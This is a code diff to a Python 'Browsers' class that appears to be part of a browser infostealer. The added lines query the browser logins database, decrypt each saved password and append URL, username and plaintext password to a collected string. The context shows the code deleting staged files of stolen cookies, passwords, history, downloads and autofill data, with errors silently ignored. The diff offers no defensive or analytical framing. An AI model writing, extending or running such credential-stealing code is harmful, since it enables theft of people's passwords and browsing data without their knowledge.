@@ -115,6 +115,10 @@ class Browsers():
                         url, name, password = V
                         dec = self._decrypt(password,key)
                         self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
+                    for V in cursor.execute("SELECT origin_url, username_value, password_value FROM logins order by date_created").fetchall():
+                        url, name, password = V
+                        dec = self._decrypt(password,key)
+                        self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
                 cursor.close()
                 con.close()
             except:pass
@@ -221,5 +225,3 @@ class Browsers():
             os.remove(os.path.join(apdata, "Cookies.txt"));os.remove(os.path.join(apdata, "Passw.txt"));os.remove(os.path.join(apdata, "credsc.txt"));os.remove(os.path.join(apdata, "Histo.txt"));os.remove(os.path.join(apdata, "Downs.txt"));os.remove(os.path.join(apdata, "Autofill.txt"))
         except:
             pass
-
-
